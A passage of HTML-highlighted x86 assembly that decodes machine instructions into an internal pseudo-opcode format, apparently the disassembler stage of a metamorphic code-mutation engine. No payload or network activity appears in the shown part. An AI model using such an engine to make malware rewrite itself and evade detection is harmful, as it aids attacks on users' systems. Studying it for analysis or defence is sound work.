                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">; Add the length of the rest of the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; instruction to get the value OPed</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">; Subtract it because later we'll add</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">          </span><span class="sc1">; it again.</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Gen2_Gen_Memory</span><span class="sc0">

      </span><span class="sc5">@@Gen2_32b_Register</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the value</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Set it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the operation opcode</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">          </span><span class="sc1">; Add the length of the instruction</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Gen2_Gen_Register</span><span class="sc0">

      </span><span class="sc5">@@Gen2_8b</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the 2nd opcode</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">        </span><span class="sc1">; Extract the operation and set it as</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">        </span><span class="sc1">;  a 8 bits pseudooperation.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Set it</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc5">@@Gen2_Gen_Signed</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc5">@@Gen8Value</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the 2nd opcode</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">       </span><span class="sc1">; If we use a register, jump</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Gen2_8b_Register</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Set "Mem" usage</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">; Decode the memory address</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DecodeMemoryConstruction</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; Get the Imm of the operation in EAX</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Gen8Value_01</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
          </span><span class="sc5">@@Gen8Value_01</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc5">@@Gen2_Gen_Memory</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Set it in the pseudoinstruction</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">          </span><span class="sc1">; Increase EIP and decode the next</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextInstruction</span><span class="sc0"> </span><span class="sc1">; instruction.</span><span class="sc0">

      </span><span class="sc5">@@Gen2_8b_Register</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the Imm and extend the sign</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Gen2_8b_Register_01</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
         </span><span class="sc5">@@Gen2_8b_Register_01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Set it in the pseudo-instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the 2nd opcode</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">          </span><span class="sc1">; Add the length of the instruction</span><span class="sc0">
      </span><span class="sc5">@@Gen2_Gen_Register</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; to EIP</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">          </span><span class="sc1">; Get the register of the instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Set the register</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextInstruction</span><span class="sc0"> </span><span class="sc1">; Decode the next instruction</span><span class="sc0">


</span><span class="sc1">;;;; LEA decoding</span><span class="sc0">

     </span><span class="sc5">@@LEA</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc0">      </span><span class="sc1">; Set the pseudoopcode of LEA</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; Decode the memory address</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DecodeMemoryConstruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">       </span><span class="sc1">; Get the destiny register and set it</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; Add the length of the instruction to</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextInstruction</span><span class="sc0"> </span><span class="sc1">; the EIP.</span><span class="sc0">

</span><span class="sc1">;;;; POP Mem decoding</span><span class="sc0">

     </span><span class="sc5">@@POPMem</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the operand</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">     </span><span class="sc1">; Get if we use reg or memory address</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@POPMem_butReg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">59h</span><span class="sc0">      </span><span class="sc1">; If we use a memory address, set the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; opcode and decode the memory address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DecodeMemoryConstruction</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextInstruction</span><span class="sc0">
     </span><span class="sc5">@@POPMem_butReg</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">; If it uses a register, set it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">      </span><span class="sc1">; Set the opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextInstruction</span><span class="sc0">

</span><span class="sc1">;;;; XCHG With EAX:</span><span class="sc0">
</span><span class="sc1">;; Disabled since we aren't coding XCHG</span><span class="sc0">

</span><span class="sc1">;      @@XCHGWithEAX:</span><span class="sc0">
</span><span class="sc1">;                 mov     al, [esi]</span><span class="sc0">
</span><span class="sc1">;                 add     esi, 1</span><span class="sc0">
</span><span class="sc1">;                 cmp     eax, 90h</span><span class="sc0">
</span><span class="sc1">;                 jz    @@NOP</span><span class="sc0">
</span><span class="sc1">;                 and     eax, 7</span><span class="sc0">
</span><span class="sc1">;                 mov     [edi+1], al</span><span class="sc0">
</span><span class="sc1">;                 mov     eax, 48h+5</span><span class="sc0">
</span><span class="sc1">;                 mov     [edi], al</span><span class="sc0">
</span><span class="sc1">;                 xor     eax, eax</span><span class="sc0">
</span><span class="sc1">;                 mov     [edi+7], eax</span><span class="sc0">
</span><span class="sc1">;                 jmp   @@NextInstruction</span><span class="sc0">

</span><span class="sc1">;; NOP instruction</span><span class="sc0">

     </span><span class="sc5">@@NOP</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">  </span><span class="sc1">; Set the NOP pseudoopcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextInstruction</span><span class="sc0">

</span><span class="sc1">;;;; MOV AL/EAX,Mem</span><span class="sc0">
</span><span class="sc1">; This one is also disabled, because we doesn't have direct memory operations</span><span class="sc0">
</span><span class="sc1">; to disassemble.</span><span class="sc0">
</span><span class="sc1">;      @@MOVALMem:</span><span class="sc0">
</span><span class="sc1">;                 mov     eax, 0C2h</span><span class="sc0">
</span><span class="sc1">;      @@MOVxAxMem:</span><span class="sc0">
</span><span class="sc1">;                 mov     [edi], eax</span><span class="sc0">
</span><span class="sc1">;                 mov     eax, 8</span><span class="sc0">
</span><span class="sc1">;                 mov     [edi+1], eax</span><span class="sc0">
</span><span class="sc1">;                 mov     [edi+2], eax</span><span class="sc0">
</span><span class="sc1">;                 xor     eax, eax</span><span class="sc0">
</span><span class="sc1">;                 mov     [edi+7], eax</span><span class="sc0">
</span><span class="sc1">;                 mov     eax, [esi+1]</span><span class="sc0">
</span><span class="sc1">;                 mov     [edi+3], eax</span><span class="sc0">
</span><span class="sc1">;                 add     esi, 5</span><span class="sc0">
</span><span class="sc1">;                 jmp   @@NextInstruction</span><span class="sc0">
</span><span class="sc1">;      @@MOVEAXMem:</span><span class="sc0">
</span><span class="sc1">;                 mov     eax, 42h</span><span class="sc0">
</span><span class="sc1">;                 jmp   @@MOVxAxMem</span><span class="sc0">

</span><span class="sc1">;;;; MOV Mem,AL/EAX</span><span class="sc0">

</span><span class="sc1">;      @@MOVMemAL:</span><span class="sc0">
</span><span class="sc1">;                 mov     eax, 0C3h</span><span class="sc0">
</span><span class="sc1">;                 jmp   @@MOVxAxMem</span><span class="sc0">
</span><span class="sc1">;      @@MOVMemEAX:</span><span class="sc0">
</span><span class="sc1">;                 mov     eax, 43h</span><span class="sc0">
</span><span class="sc1">;                 jmp   @@MOVxAxMem</span><span class="sc0">

</span><span class="sc1">;;;; TEST AL,Value decodification</span><span class="sc0">

     </span><span class="sc5">@@TESTALValue</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the value</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Put it in ECX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C8h</span><span class="sc0">     </span><span class="sc1">; Put the pseudoopcode in EAX</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
     </span><span class="sc5">@@TESTxAxValue</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Set the pseudoopcode</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Set the register</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">  </span><span class="sc1">; Set the value</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextInstruction</span><span class="sc0">

</span><span class="sc1">;;;; TEST EAX,Value</span><span class="sc0">

     </span><span class="sc5">@@TESTEAXValue</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the Imm in ECX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">      </span><span class="sc1">; 48h = TEST pseudoopcode</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">        </span><span class="sc1">; Increase the EIP</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@TESTxAxValue</span><span class="sc0">

</span><span class="sc1">;;;; MOV Reg,Value decodification</span><span class="sc0">

     </span><span class="sc5">@@MOVRegValue</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">; 40h = MOV pseudoopcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the value in ECX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
     </span><span class="sc5">@@MOVRegValue_Common</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">        </span><span class="sc1">; Get the register in EAX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Set the register</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">  </span><span class="sc1">; Set the value</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextInstruction</span><span class="sc0">
     </span><span class="sc5">@@MOVReg8Value</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; C0 = MOV 8 bits</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the Imm to move</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the opcode to extract the register</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@MOVRegValue_Common</span><span class="sc0">

</span><span class="sc1">;;;; ROL/ROR/etc. decodification</span><span class="sc0">

      </span><span class="sc5">@@BitShifting32</span><span class="sc4">:</span><span class="sc0">
